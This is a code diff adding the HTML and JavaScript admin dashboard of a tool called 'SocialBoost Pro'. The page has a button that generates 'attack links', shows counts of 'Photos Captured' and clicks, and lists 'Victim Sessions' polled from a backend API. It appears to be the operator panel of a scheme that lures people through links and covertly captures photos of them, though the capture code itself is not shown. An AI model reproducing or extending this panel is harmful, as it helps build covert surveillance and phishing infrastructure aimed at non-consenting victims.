@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SocialBoost Pro - Admin</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a1a;
+            color: #fff;
+            padding: 20px;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .header h1 {
+            font-size: 28px;
+            background: linear-gradient(90deg, #c084fc, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .badge {
+            background: rgba(236,73,153,0.2);
+            color: #ec4899;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            border: 1px solid rgba(236,73,153,0.3);
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: rgba(255,255,255,0.05);
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.05);
+            text-align: center;
+        }
+        .stat-card .number {
+            font-size: 32px;
+            font-weight: 700;
+            color: #c084fc;
+        }
+        .stat-card .label {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            margin-top: 5px;
+        }
+        .btn-primary {
+            background: linear-gradient(90deg, #c084fc, #ec4899);
+            border: none;
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .btn-primary:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 30px rgba(192,132,252,0.3);
+        }
+        .sessions {
+            margin-top: 30px;
+        }
+        .session-item {
+            background: rgba(255,255,255,0.03);
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-left: 3px solid rgba(255,255,255,0.1);
+        }
+        .session-item.active {
+            border-left-color: #c084fc;
+        }
+        .session-id {
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: #c084fc;
+        }
+        .session-status {
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .status-active {
+            background: rgba(192,132,252,0.2);
+            color: #c084fc;
+        }
+        .status-waiting {
+            background: rgba(255,255,255,0.1);
+            color: rgba(255,255,255,0.5);
+        }
+        .session-details {
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+        }
+        .link-box {
+            background: rgba(255,255,255,0.05);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .copy-btn {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        .copy-btn:hover {
+            background: rgba(255,255,255,0.2);
+        }
+        .btn-secondary {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .btn-secondary:hover {
+            background: rgba(255,255,255,0.2);
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🚀 SocialBoost Pro - Admin</h1>
+        <span class="badge">🔴 LIVE</span>
+    </div>
+    
+    <div class="stats" id="stats">
+        <div class="stat-card">
+            <div class="number" id="totalSessions">0</div>
+            <div class="label">Total Sessions</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="activeSessions">0</div>
+            <div class="label">Active</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="totalPhotos">0</div>
+            <div class="label">Photos Captured</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="totalClicks">0</div>
+            <div class="label">Total Clicks</div>
+        </div>
+    </div>
+    
+    <div class="btn-group">
+        <button class="btn-primary" id="generateBtn">🎯 Generate New Attack Link</button>
+        <button class="btn-secondary" id="refreshBtn">🔄 Refresh</button>
+    </div>
+    
+    <div id="newLinkContainer" style="display: none;">
+        <div class="link-box">
+            <span id="linkText">Loading...</span>
+            <button class="copy-btn" onclick="copyLink()">📋 Copy</button>
+        </div>
+    </div>
+    
+    <div class="sessions">
+        <h3 style="margin-bottom: 15px; color: rgba(255,255,255,0.7);">📊 Victim Sessions</h3>
+        <div id="sessionsList">
+            <p style="color: rgba(255,255,255,0.3); text-align: center; padding: 40px 0;">
+                No sessions yet. Generate a link to start.
+            </p>
+        </div>
+    </div>
+    
+    <script>
+        let currentLink = '';
+        
+        async function fetchDashboard() {
+            try {
+                const res = await fetch('/api/dashboard');
+                const data = await res.json();
+                
+                const sessions = data.sessions || [];
+                document.getElementById('totalSessions').textContent = sessions.length;
+                document.getElementById('activeSessions').textContent = sessions.filter(s => s.status === 'ACTIVE').length;
+                document.getElementById('totalPhotos').textContent = sessions.reduce((sum, s) => sum + (s.photos || 0), 0);
+                document.getElementById('totalClicks').textContent = sessions.reduce((sum, s) => sum + (s.clicks || 0), 0);
+                
+                const list = document.getElementById('sessionsList');
+                if (sessions.length === 0) {
+                    list.innerHTML = '<p style="color: rgba(255,255,255,0.3); text-align: center; padding: 40px 0;">No sessions yet. Generate a link to start.</p>';
+                    return;
+                }
+                
+                list.innerHTML = sessions.map(s => `
+                    <div class="session-item ${s.status === 'ACTIVE' ? 'active' : ''}">
+                        <div>
+                            <div class="session-id">${s.id}</div>
+                            <div class="session-details">Clicks: ${s.clicks} · Photos: ${s.photos} · Created: ${new Date(s.created).toLocaleString()}</div>
+                        </div>
+                        <div>
+                            <span class="session-status ${s.status === 'ACTIVE' ? 'status-active' : 'status-waiting'}">${s.status}</span>
+                        </div>
+                    </div>
+                `).join('');
+                
+            } catch (err) {
+                console.error('Failed to fetch dashboard:', err);
+            }
+        }
+        
+        document.getElementById('generateBtn').addEventListener('click', async () => {
+            try {
+                const res = await fetch('/api/generate', { method: 'POST' });
+                const data = await res.json();
+                
+                currentLink = data.link;
+                document.getElementById('linkText').textContent = currentLink;
+                document.getElementById('newLinkContainer').style.display = 'block';
+                
+                setTimeout(fetchDashboard, 1000);
+            } catch (err) {
+                alert('Failed to generate link: ' + err.message);
+            }
+        });
+        
+        function copyLink() {
+            navigator.clipboard.writeText(currentLink).then(() => {
+                alert('✅ Link copied to clipboard!');
+            }).catch(() => {
+                const textarea = document.createElement('textarea');
+                textarea.value = currentLink;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert('✅ Link copied!');
+            });
+        }
+        
+        document.getElementById('refreshBtn').addEventListener('click', fetchDashboard);
+        
+        fetchDashboard();
+        setInterval(fetchDashboard, 10000);
+    </script>
+</body>
+</html>
